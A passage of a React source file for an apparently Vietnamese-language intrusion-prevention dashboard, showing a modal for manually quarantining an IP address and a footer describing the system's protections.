        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/50 backdrop-blur-xs animate-fadeIn">
          <div className="bg-white dark:bg-slate-800 w-full max-w-md rounded-2xl shadow-2xl border border-slate-200 dark:border-slate-700 p-5">
            <h4 className="font-bold text-slate-900 dark:text-white text-base mb-3">
              Cách ly IP thủ công
            </h4>
            <div className="space-y-3 mb-4">
              <div>
                <label className="text-xs font-medium text-slate-700 dark:text-slate-300 block mb-1">
                  Địa chỉ IP cần cách ly:
                </label>
                <input
                  type="text"
                  placeholder="Ví dụ: 185.220.101.5"
                  value={manualIp}
                  onChange={(e) => setManualIp(e.target.value)}
                  className="w-full px-3 py-2 text-xs font-mono bg-slate-50 dark:bg-slate-900 border border-slate-300 dark:border-slate-600 rounded-xl text-slate-900 dark:text-white outline-none focus:ring-2 focus:ring-orange-500"
                />
              </div>
              <div>
                <label className="text-xs font-medium text-slate-700 dark:text-slate-300 block mb-1">
                  Lý do cách ly:
                </label>
                <input
                  type="text"
                  value={manualReason}
                  onChange={(e) => setManualReason(e.target.value)}
                  className="w-full px-3 py-2 text-xs bg-slate-50 dark:bg-slate-900 border border-slate-300 dark:border-slate-600 rounded-xl text-slate-900 dark:text-white outline-none focus:ring-2 focus:ring-orange-500"
                />
              </div>
            </div>
            <div className="flex gap-2 justify-end">
              <button
                type="button"
                onClick={() => setShowManualQuarantine(false)}
                className="px-3.5 py-2 text-xs font-semibold text-slate-700 dark:text-slate-300 bg-slate-100 dark:bg-slate-700 rounded-xl hover:bg-slate-200"
              >
                Hủy
              </button>
              <button
                type="button"
                onClick={handleAddManualQuarantine}
                disabled={!manualIp.trim()}
                className="px-4 py-2 text-xs font-semibold text-white bg-purple-600 hover:bg-purple-700 rounded-xl disabled:opacity-50"
              >
                Kích hoạt cách ly
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Footer info */}
      <div className="p-3 bg-slate-50 dark:bg-slate-750/40 border border-slate-200/80 dark:border-slate-700/80 rounded-xl text-[11px] text-slate-500 dark:text-slate-400 flex flex-col sm:flex-row items-center justify-between gap-2">
        <span>
          🛡️ Hệ thống IDS/IPS sử dụng thuật toán Deep Packet Inspection bảo vệ chống SQLi, XSS, Path Traversal và Botnet.
        </span>
        <span className="font-medium text-slate-700 dark:text-slate-300 shrink-0">
          Chữ ký cập nhật: 2026-09-11
        </span>
      </div>
    </div>
  );
}